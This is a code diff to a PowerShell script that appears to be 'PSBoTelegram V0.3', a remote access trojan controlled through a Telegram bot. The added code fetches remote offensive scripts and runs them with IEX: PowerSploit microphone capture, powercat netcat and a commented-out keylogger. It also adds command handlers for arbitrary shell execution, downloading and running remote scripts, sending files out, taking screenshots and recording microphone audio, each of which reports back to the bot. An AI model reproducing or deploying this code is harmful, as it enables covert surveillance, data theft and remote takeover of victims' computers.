@@ -1,4 +1,10 @@
 
+################################################ Cargamos funciones de otros proyectos ########################################################################
+
+IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
+$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
+#IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
+
 function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
 
 function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }
@@ -8,7 +14,7 @@ function bot-send {
 param ($photo,$file,$botkey,$chat_id)
 
 $proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
-$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
+$ruta = $env:USERPROFILE + "\appdata\local\temp\1"
 $curl_zip = $ruta + "\curl_752_1.zip"
 $curl = $ruta + "\" + "curl.exe"
 $curl_mod = $ruta + "\" + "curl_mod.exe"
@@ -91,7 +97,7 @@ $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master
 
 function screen-shot {param ($botkey,$chat)
 
-$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1\" + "screenshot.png"
 
 Add-Type -AssemblyName System.Windows.Forms
 $resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
@@ -120,5 +126,33 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
  screenshot $bounds $ruta
 
 bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
+
+}
+function graba-audio { param ($botkey,$chat_id,$segundos)
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
+$audio = $ruta + "\" + "audio.wav"
+if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
+Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
+bot-send -file $audio -botkey $botkey -chat_id $chat_id
+
+}
+
+
+function test-command {param ($comando="",$botkey="",$chat_id="") 
+ $help = "PSBoTelegram V0.3`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio"
+ if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
+ if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
+ if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
+ if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
+ if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
+
 
 }
